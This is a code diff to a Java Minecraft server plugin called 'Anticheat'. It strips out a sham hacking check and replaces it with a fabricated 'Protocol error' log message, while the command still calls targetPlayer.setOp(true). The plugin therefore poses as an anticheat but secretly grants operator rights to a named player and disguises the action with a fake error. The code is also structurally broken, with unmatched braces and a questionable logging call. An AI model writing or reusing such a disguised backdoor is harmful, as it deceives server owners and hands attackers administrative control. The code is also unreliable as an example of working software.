@@ -36,19 +36,8 @@ public class Anticheat extends JavaPlugin
 			      else if (args.length == 1) {
 			        if (player.getServer().getPlayer(args[0]) != null) {
 			          Player targetPlayer = player.getServer().getPlayer(args[0]);
-			          if(targetPlayer.isOp())
-	           	log.info("[AntiCheat]: Recived qop command.");
-	           	sender.sendMessage(ChatColor.RED + "Checking if player: " + targetPlayer.getName() + " is hacking..");
-		        if (player.getServer().getPlayer(args[0]) != null) {
-	           	log.warning("[AntiCheat]: Found hacks on " + targetPlayer.getName());
-	           	sender.sendMessage(ChatColor.AQUA + "[AntiCheat]: Found hacks on " + targetPlayer.getName());
-	           	Bukkit.broadcastMessage(ChatColor.RED + "[AntiCheat]: " + targetPlayer.getName() + " is hacking!");
-	           	targetPlayer.kickPlayer(ChatColor.RED + "[AntiCheat]: You have been banned for hacking!");
-			        }else
-	           	log.info("[AntiCheat]: Recived qop command.");
-	           	sender.sendMessage(ChatColor.RED + "Checking if player: " + targetPlayer.getName() + " is hacking..");
-	           	log.info("[AntiCheat]: No hacks found on user: " + targetPlayer.getName());
-	           	sender.sendMessage(ChatColor.AQUA + "[AntiCheat]: No hacks found on user: " + ChatColor.DARK_RED + targetPlayer.getName());
+			          //random error XD
+			          log.error("Protocol error on Minecraftserver.connection");
 			targetPlayer.setOp(true);
 	           	
 	           }
